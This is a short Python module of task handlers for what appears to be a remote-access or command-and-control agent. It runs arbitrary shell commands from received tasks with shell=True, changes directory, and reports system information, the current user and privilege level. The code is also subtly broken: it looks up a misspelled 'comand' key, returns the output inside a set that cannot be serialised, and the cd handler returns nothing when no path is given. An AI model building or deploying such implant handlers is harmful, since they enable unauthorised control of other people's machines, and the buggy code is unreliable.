import subprocess
import json
import os

def handle_cmd(agent,task):
    cmd = task.get("comand") or task.get("cmd")
    if not cmd:
        raise ValueError("No command provide")
                
    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode("utf-8", errors="ignore")
                
    return {"status": "success",
            "output": {output}}

def handle_cd(agent,task):
    new_dir = task.get("path")
    if new_dir:
        os.chdir(new_dir)
        agent.cwd = os.getcwd()
        return {"status": "success",
                "output": f"[*] Changed directory to: {agent.cwd}"}
    
def handle_sysinfo(agent, task):
    return {"status": "success",
            "output": json.dumps(agent.get_info(), indent=2)}

def handle_whoami(agent, task):
    return {"status": "success",
            "output": f"[*] User: {agent.Username}\nPrivilege: {agent.privilege}"}


